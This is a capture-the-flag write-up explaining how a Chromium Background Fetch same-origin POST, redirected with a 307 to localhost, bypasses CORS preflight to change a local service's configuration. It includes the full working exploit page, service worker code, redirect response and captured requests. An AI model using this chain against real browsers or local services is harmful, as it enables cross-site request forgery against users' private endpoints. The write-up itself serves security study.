# 07CTF 2026 — I Hate CSRF Tokens

## **Overview**

We used **Background Fetch to send a same-origin JSON POST to our own server**, then returned a **307 redirect** to:

```
http://localhost:3001/config
```

The native download path followed the redirect while preserving the POST method, JSON content type, and body. This disabled the application’s construction mode and made **`/flag`** available.

## **1. The target**

The application used **`express.json()`** and started with:

```
let is_under_construction = true;
```

**`POST /config`** required:

- A loopback source address.
- A hostname of **`localhost`** or **`127.0.0.1`**.
- A boolean **`config`** field in the parsed JSON body.

The useful body was:

```
{"config":false}
```

Once accepted, **`GET /flag`** returned the flag instead of HTTP 503.

The bot visited an attacker-supplied URL from the target’s own environment, giving us a browser capable of reaching its loopback service.

## **2. The same-origin admission gap**

An ordinary cross-origin JSON fetch requires preflight. While reviewing Background Fetch, we found this code in Chromium’s **`RequiresCorsPreflight`**:

```
// Same origin requests don't require a CORS preflight.
// TODO(crbug.com/40515511): Make sure that cross-origin redirects are
// disabled.
if (url::IsSameOriginWith(origin.GetURL(),fetch_request->url))
  return false;
```

This suggested a two-step request:

```
Same-origin JSON POST to our server
                  |
                  | 307 redirect
                  v
POST to the bot-local /config endpoint
```

The initial request passed the same-origin check. The native download implementation then followed the cross-origin redirect.

## **3. The payload**

We served the following page from a trusted public HTTPS origin:

```
<!doctype html>
<meta charset="utf-8">
<script>
(async ()=> {
  await navigator.serviceWorker.register('/sw.js');
  const registration = await navigator.serviceWorker.ready;

  const request = new Request('/redirect307', {
    method:'POST',
    headers: {'Content-Type':'application/json'},
    body:JSON.stringify({config:false})
  });

  await registration.backgroundFetch.fetch(
    'csrf-' + Date.now(),
    [request],
    {title:'Download',downloadTotal:65536}
  );
})().catch(console.error);
</script>
```

The relative **`/redirect307`** URL is important: the initial request must be same-origin with the service worker registration.

The worker only needed to activate:

```
self.addEventListener('install',event => {
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate',event => {
  event.waitUntil(self.clients.claim());
});
```

After consuming the POST body, our **`/redirect307`** endpoint returned:

```
HTTP/1.1 307 Temporary Redirect
Location: http://localhost:3001/config
Content-Length: 0
Cache-Control: no-store
```

A 307 preserves the request method and body.

All worker registration and initial request creation happened on our own origin, so the successful chain did not depend on the victim page’s HTML injection or CSP.

## **4. What reached the target**

In the original-application local reproduction, a passive observer recorded these relevant request fields:

```
POST /configHTTP/1.1
Host: localhost:3001
Content-Type: application/json
Origin: null
Sec-Fetch-Mode: navigate

{"config":false}
```

The source address was **`::1`**. The target returned HTTP 200, and an independent **`/flag`** request changed from 503 to 200.

We also verified this chain using a genuine public HTTPS attacker origin with normal TLS verification.

Interestingly, Background Fetch later reported:

```
backgroundfetchfail / fetch-error
```

That did not mean the POST had been prevented. The server had already processed the request and changed its state. Response visibility was a later, separate decision.

## **5. Remote solve**

We sent the bot to the public HTTPS payload:

```
GET <challenge-origin>/bot?visit=<URL-encoded payload URL>
```

After 15 seconds, a request to **`/flag`** returned:

```
07CTF{hoW_cAn_y0u_p057_j5ON_wIthOuT_pREf1iGht?!}
```

The successful remote acquisition used **one bot visit**, followed by **one flag request**. The first flag submission was accepted.

Our local reference browser was **Chrome 150.0.7871.24**. The deployed CSRF browser version was not independently identified; the remote flag and acceptance records establish the contest result.

## **Takeaway**

The exploit relied on three separate stages:

1. **Initial admission:** a same-origin JSON POST passed the preflight gate.
2. **Redirect handling:** the native download path carried the POST to another origin.
3. **Response visibility:** a later error occurred after the server-side mutation.

The important observation was the target’s state change, not the final Background Fetch success or failure signal.

Relevant Chromium source: [initial preflight check and redirect TODO](https://github.com/chromium/chromium/blob/150.0.7871.24/content/browser/background_fetch/background_fetch_job_controller.cc#L36-L65).